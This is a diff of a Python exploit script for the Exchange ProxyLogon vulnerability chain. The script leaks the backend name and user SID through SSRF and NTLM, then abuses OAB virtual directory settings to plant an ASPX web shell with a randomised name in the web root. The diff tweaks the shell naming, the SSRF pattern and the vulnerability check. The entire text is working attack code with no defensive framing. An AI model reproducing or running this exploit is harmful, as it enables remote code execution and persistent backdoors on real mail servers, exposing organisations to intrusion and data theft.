@@ -1,8 +1,12 @@
-import requests, urllib3, sys, re, base64
+import requests, urllib3, sys, re, base64, random
 from impacket import ntlm
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-use_name = "poc"
+
+def gen():
+    return ''.join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") for _ in range(0x5))
+
+use_name = gen()
 user_agent = {"User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36"}
 
 shell_path = "C:\\inetpub\\wwwroot\\aspnet_client\\{}.aspx".format(use_name)
@@ -19,7 +23,7 @@ autodiscover_body = """<Autodiscover xmlns="http://schemas.microsoft.com/exchang
 proxylogon_body = '<r at="AuthenticationType" ln="LogonName"><s>{}</s></r>'
 
 get_RawIdentity = {'properties':{'Parameters':{'__type':'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel','Identity': 'OAB*'}}}
-OABVirtualDirectory = {'identity': {'__type': 'Identity:ECP', 'DisplayName': 'OAB (Default Web Site)', 'RawIdentity': '{}' },'properties': {'Parameters': {'__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel','ExternalUrl': 'http://0xff/#{}'.format(shell_src)}}}
+OABVirtualDirectory = {'identity': {'__type': 'Identity:ECP', 'DisplayName': 'OAB (Default Web Site)', 'RawIdentity': '{}' },'properties': {'Parameters': {'__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel','ExternalUrl': 'http://host/#{}'.format(shell_src)}}}
 ResetOABVirtualDirectory = {'identity': {'__type': 'Identity:ECP','DisplayName': 'OAB (Default Web Site)', 'RawIdentity': '{}' },'properties': {'Parameters': {'__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel','FilePathName': '{}'.format(shell_path) }}}
 
 def RCE(host, email):
@@ -29,10 +33,13 @@ def RCE(host, email):
     print("host: {} - email: {}".format(host, email))
 
     print("[+] leaking required infos ..")
-    CN = get_CN(session, host)
+    CN, used_ntlm = get_CN(session, host)
     print("[*] Computer Name: {}".format(CN))
 
-    do_NTLM(session, host, just_enum=True)
+    if not used_ntlm:
+        do_NTLM(session, host, just_enum=True)
+    else:
+        pass
 
     user_SID = get_SID(session, host, email, CN)
     print("[*] user SID: {}".format(user_SID))
@@ -59,21 +66,21 @@ def RCE(host, email):
 
 def get_CN(session, host):
     if any(char.isdigit() for char in use_name) or len(use_name) < 3:
-        pattern = "asdfsdfaasdf"
+        pattern = "kkkk"
     else:
-        pattern = use_name
-    ssrf_url = "[{0}]@{0}:444/".format(pattern)
+        pattern = use_name.lower()
+    ssrf_url = "[{0}]@{0}/".format(pattern)
     response = do_SSRF(session, "get", host, ssrf_url)
-    if "NegotiateSecurityContext failed" not in response.text or pattern not in response.text:
+    if "NegotiateSecurityContext failed" not in response.text and pattern not in response.text and pattern != response.headers["X-CalculatedBETarget"]:
         print("[!] It seems that {} is not vulnerable! Aborting ..".format(host.split("://")[1]))
         exit(1)
 
     if "X-FEServer" in response.headers.keys():
-        return response.headers["X-FEServer"]
+        return response.headers["X-FEServer"], False
     else:
         print("[WARNING] backend name not found in response headers")
         print("[+] trying to get backend name using NTLM auth ..")
-        return do_NTLM(session, host)
+        return do_NTLM(session, host), True
 
 def get_SID(session, host, email, CN):
     legacyDN, DC_address, RPC_address = get_legacyDN(session, host, email, CN)
